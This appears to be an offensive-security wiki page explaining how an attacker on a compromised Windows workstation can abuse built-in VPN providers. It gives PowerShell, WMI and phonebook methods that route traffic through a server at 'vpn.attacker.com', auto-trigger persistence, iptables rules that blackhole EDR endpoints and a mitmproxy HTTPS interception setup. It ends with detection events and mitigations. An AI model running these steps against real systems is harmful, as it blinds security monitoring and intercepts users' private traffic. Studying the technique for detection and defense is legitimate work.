---
title: Windows Built-in VPN Abuse
permalink: /wiki/concepts/vpn-abuse-windows/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
redirect_from:
- /wiki/concepts/vpn-abuse-windows/
---

**Category:** Defense Evasion / Network Manipulation
**MITRE ATT&CK:** T1599 — Network Boundary Bridging; T1557 — Adversary-in-the-Middle
**Related:** [Evasion Techniques](/wiki/concepts/evasion-techniques/), [Post Exploitation](/wiki/concepts/post-exploitation/), [Lateral Movement](/wiki/concepts/lateral-movement/)

## Overview
Windows has built-in VPN providers (PPTP, L2TP, SSTP, IKEv2) that any standard user can configure and connect to without admin rights or third-party software. By standing up a VPN server and connecting to it from a compromised workstation, an attacker can modify the system routing table as a standard user — routing traffic through attacker infrastructure to selectively blackhole EDR/logging traffic or man-in-the-middle all HTTPS connections.

## Why This Matters
Modifying the routing table normally requires administrator rights. But connecting to a VPN with the built-in provider (which uses the RasMan service running as SYSTEM) allows user-level code to effectively add arbitrary routes to the system routing table.

## Built-in VPN Protocols
Available from Settings → Network & Internet → VPN (no admin, no third-party install):
- PPTP
- L2TP/IPsec (PSK or cert)
- SSTP (SSL-based — blends with HTTPS traffic, no proxy dependency)
- IKEv2
- Automatic (tries all)

## Adding a VPN Connection — Methods

### PowerShell (Most Scriptable)
```powershell
# Add connection
Add-VpnConnection -Name exampleVPN -ServerAddress vpn.attacker.com `
    -TunnelType Sstp -EncryptionLevel Optional `
    -AuthenticationMethod MSChapv2 -SplitTunneling -RememberCredential

# Connect
rasdial exampleVPN username password

# Add specific routes through VPN
Add-VpnConnectionRoute -ConnectionName exampleVPN -DestinationPrefix 1.2.3.4/32

# Disable split tunneling (tunnel ALL traffic)
Set-VpnConnection -Name exampleVPN -SplitTunneling $false
```

### WMI (Useful for Remote Manipulation)
```bash
# Add VPN remotely via WMI (all-user connection)
wmic /NODE:"target.example.org" /NAMESPACE:"\\root\Microsoft\Windows\RemoteAccess\Client" `
    PATH PS_VPNConnection CALL Add Name="MyVPN" ServerAddress="vpn.attacker.com" `
    TunnelType="Sstp" AllUserConnection=1
```
PowerShell VPN cmdlets are backed by WMI/CIM — can use `-CimSession` for remote execution.

### Phonebook File (Direct Manipulation)
Files:
- Per-user: `%appdata%\Microsoft\Network\Connections\Pbk\rasphone.pbk`
- System-wide: `C:\ProgramData\Microsoft\Network\Connections\Pbk\rasphone.pbk`
- Hidden (won't appear in UI): `%appdata%\...\Pbk\_hiddenPbk\rasphone.pbk`

Drop a correctly-formatted phonebook entry → VPN usable immediately without reboot.

### Auto-Trigger (VPN Connects When App Starts)
```powershell
# VPN auto-connects when explorer.exe starts (any user, after reboot)
Add-VpnConnectionTriggerApplication -ConnectionName "exampleVPN" `
    -ApplicationID "C:\Windows\explorer.exe"
```
This writes to `HKLM\CurrentControlSet\Services\Rasman\Config\AutoTrigger` — done via RPC to RasMan (SYSTEM), so user-level access is sufficient.

## Routing Table Manipulation

### Option 1: Push Routes via VPN Server DHCP
Configure DHCP on SoftEther/other VPN server to push classless-win option (code 249):
```
# DHCP config (isc-dhcp-server)
option classless-win code 249 = array of unsigned integer 8;
option classless-win 32, 1,2,3,4, 192,168,1,1;  # Route 1.2.3.4/32 via 192.168.1.1
option classless-win 0, 192,168,1,1;              # Default route via VPN gateway
```
All clients receive same routes on connect.

### Option 2: Tunnel All Traffic (SplitTunnel=false)
```powershell
Set-VpnConnection -Name exampleVPN -SplitTunneling $false
```
All system traffic goes through VPN tunnel — affects all users, services, kernel connections.

### Option 3: Client-Side Specific Routes
```powershell
Add-VpnConnectionRoute -ConnectionName exampleVPN -DestinationPrefix 203.0.113.50/32
```
Forces specific IP(s) through the VPN tunnel (stored in phonebook).

## Traffic Manipulation on VPN Server (iptables)

```bash
# Blackhole EDR/logging endpoints
iptables -I FORWARD -d <EDR_SERVER_IP> -j DROP

# MitM all HTTPS traffic via mitmproxy
iptables -t nat -A PREROUTING -p tcp -s 192.168.30.0/24 --dport 443 \
    -j REDIRECT --to-port 6789
mitmproxy --mode transparent --listen-port 6789
```

## Breaking Existing Connections
Existing TCP connections are NOT affected by new routes — only new connections use new routes.

To force all traffic through the VPN (break and re-establish existing connections):
```powershell
# Requires "console" session SID (S-1-2-1) — i.e., logged-in user at console
ipconfig /release    # Breaks DHCP — forces TCP session re-establishment
# Routes persist because VPN is still connected
# All reconnected sessions now traverse VPN routes
```
This doesn't work if running as a service or remote session context (S-1-2-1 SID absent).

## Server Setup (SoftEther on Linux)
SoftEther supports all Windows built-in VPN protocols simultaneously:
```bash
# Start VPN server
vpnserver start

# Configure via vpncmd
vpncmd           # Interactive CLI
UserCreate       # Add user account
UserPasswordSet  # Set password
BridgeCreate /TAP:yes  # Create TAP interface for bridging

# Assign IP to TAP interface
ip address add 192.168.30.1/24 dev tap_vpn

# DHCP via isc-dhcp-server on tap interface
# iptables forwarding rules
# Systemctl service for auto-start
```

SSTP (recommended protocol): tunnels VPN over HTTPS/443 — crosses most firewalls, blends with legitimate HTTPS.

## Detection
Event log events in **Application** log, source **RasClient**:

| Event ID | Meaning |
|----------|---------|
| 20221 | VPN connection attempt started |
| 20222 | VPN connection destination recorded |
| 20223 | VPN connection successfully established |

Monitor for:
- Users creating VPN connections to external IPs (phonebook file changes)
- `rasdial.exe` or `rasphone.exe` running for non-corporate VPN profiles
- Route table changes (`route print` showing unexpected entries)
- SSTP connections (port 443) to non-approved HTTPS hosts from workstations

## Mitigation
- **Protect phonebook files:** Remove user write access to `%appdata%\...\rasphone.pbk`
- **Protect RasMan AutoTrigger registry:** Deny RasMan write to its own Config key (GPO)
- **Disable RasMan service** (stops all built-in VPN functionality)
- **Network egress filtering:** Block PPTP (1723), L2TP (1701/500), IKEv2 (500/4500), SSTP (443 to non-approved hosts) at perimeter
- No GPO option exists to directly block built-in VPN usage; target the service/phonebook

## References
- TrustedSec — "Abusing Windows Built-in VPN Providers" (2025-03-11)
- SoftEther VPN — softether.org; github.com/SoftEtherVPN/SoftEtherVPN
- Microsoft RAS Win32 API documentation
